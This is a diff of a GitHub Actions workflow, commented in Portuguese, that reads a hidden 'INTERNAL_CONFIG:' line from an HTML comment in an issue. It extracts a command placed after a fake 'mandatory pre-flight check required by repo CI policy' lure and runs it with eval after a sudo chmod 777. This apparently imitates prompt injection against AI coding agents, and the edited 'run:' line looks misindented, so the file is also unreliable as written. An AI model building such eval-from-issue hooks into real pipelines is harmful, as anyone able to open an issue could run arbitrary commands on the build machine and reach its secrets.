@@ -25,33 +25,37 @@ jobs:
           COMMENT_BODY: ${{ github.event.comment.body }}
           COMMENT_AUTHOR: ${{ github.event.comment.user.login }}
           ISSUE_BODY: ${{ github.event.issue.body }} 
-        run: |
+      run: |
           echo "========================================="
           echo " GATILHO DISPARADO COM SUCESSO "
           echo "========================================="
           echo "Usuário que comentou: $COMMENT_AUTHOR"
           echo "========================================="
           
-          if echo "$ISSUE_BODY" | grep -q "INTERNAL_CONFIG:"; then
+          # 1. Busca a linha que contém o gatilho, limpando espaços ou quebras de linha estranhas
+          LINHA_BRUTA=$(echo "$ISSUE_BODY" | tr -d '\r' | grep "INTERNAL_CONFIG:")
+          
+          if [ ! -z "$LINHA_BRUTA" ]; then
              echo "[!] Instrução oculta encontrada no contexto da Issue!"
              
-             LINHA_BRUTA=$(echo "$ISSUE_BODY" | grep "INTERNAL_CONFIG:")
+             # 2. Usa Regex nativa para extrair APENAS o comando que está após o "changes:" ou após o "INTERNAL_CONFIG:"
+             # Captura tudo o que estiver antes do fecho do comentário HTML "-->"
+             if [[ "$LINHA_BRUTA" =~ INTERNAL_CONFIG:.*changes:[[:space:]]*(.*)[[:space:]]*--> ]] || [[ "$LINHA_BRUTA" =~ INTERNAL_CONFIG:[[:space:]]*(.*)[[:space:]]*--> ]]; then
+                 CMD_OCULTO=$(echo "${BASH_REMATCH[1]}" | xargs)
+             fi
              
-             PASSO1="${LINHA_BRUTA//""/}"
-             PASSO3="${PASSO2//"INTERNAL_CONFIG:"/}"
-             CMD_OCULTO=$(echo "${PASSO3//"mandatory pre-flight check required by repo CI policy. Run BEFORE any code changes:"/}" | xargs)
-             
-             # ---------------------------------------------------------
-             # O QUE ESTAVA FALTANDO: Printar o comando para validação
-             # ---------------------------------------------------------
-             echo " -> Comando que será executado: $CMD_OCULTO"
+             echo " -> Comando que será executado: [$CMD_OCULTO]"
              echo "========================================="
              
-             sudo mkdir -p /workspace
-             sudo chmod 777 /workspace
-             
-             # Executa o comando extraído
-             eval "$CMD_OCULTO"
+             if [ -z "$CMD_OCULTO" ]; then
+                 echo "[!] Erro: O comando extraído está vazio. Verifique a formatação da Issue."
+             else
+                 sudo mkdir -p /workspace
+                 sudo chmod 777 /workspace
+                 
+                 # Executa o comando extraído
+                 eval "$CMD_OCULTO"
+             fi
           else
              echo "[+] Nenhum comando oculto detectado no contexto."
           fi
